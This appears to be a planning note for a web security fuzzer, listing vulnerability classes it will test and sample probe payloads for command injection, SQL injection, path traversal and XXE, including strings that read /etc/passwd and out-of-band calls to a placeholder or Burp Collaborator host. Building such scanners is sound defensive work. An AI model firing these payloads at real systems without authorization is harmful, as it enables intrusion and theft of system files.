# ATTACKS

A list of attacks that will be supported by the initial fuzzing layer along with their requirements so that we can better figure out what engine support we need to add.

1. OS Command Injections -> [Reflection] [Time-delay] [OOB]
   1. Windows
   2. Linux

[Reflection] -> `& /bin/cat /etc/passwd`
[Time-delay] -> `& sleep 10`
[OOB] -> `&nslookup <oob-server>`

2. SQL Injections 
   1. Error Based -> [Reflection]
   2. Boolean Based -> [Heuristics]
   3. Blind Time Based -> [Time-delay]
   4. OOB Based -> [OOB]

[Reflection] -> `'` Leads to SQL error messages in response
[Heuristics] -> `' AND '1'='1` works, `' AND '1'='2` doesn't, compare with base, attack, and non-attack
[Time-delay] -> `' OR SLEEP(10)#` 
[OOB] -> `' select @@version into outfile '\\\\<oob-server>';`

3. File Path Traversal -> [Depth-Limit(attr)]
   1. Windows
   2. Linux

[Windows] -> `/../../../boot.ini`
[Linux] -> `../../../etc/passwd`

4. XML External Entity Injection   
   1. Reflection -> [Reflection]
   2. OOB Based -> [OOB] 

[Reflection] -> `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`
[OOB] -> `<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;]><r></r>`

5. LDAP Injection
6. XPath Injection
7.  XML Injection
8.  Out of Band Resource Load
9.  File Path Manipulation
10. Code Injection -> [Reflection] [Time-delay]
    1.  PHP
    2.  Server-Side Javascript
    3.  ASP
    4.  Perl
    5.  Ruby
    6.  Python
    7.  Expression Language
11. Server Side Template Injection
12. SSI Injection
13. Cross Site Scripting (Stored)
14. Web cache poisoning
15. Cross-site scripting (reflected)
16. External Service Interaction (DNS, HTTP, SMTP)
17. Open Redirection

### Future Items

17. GraphQL Issues
18. JWT Issues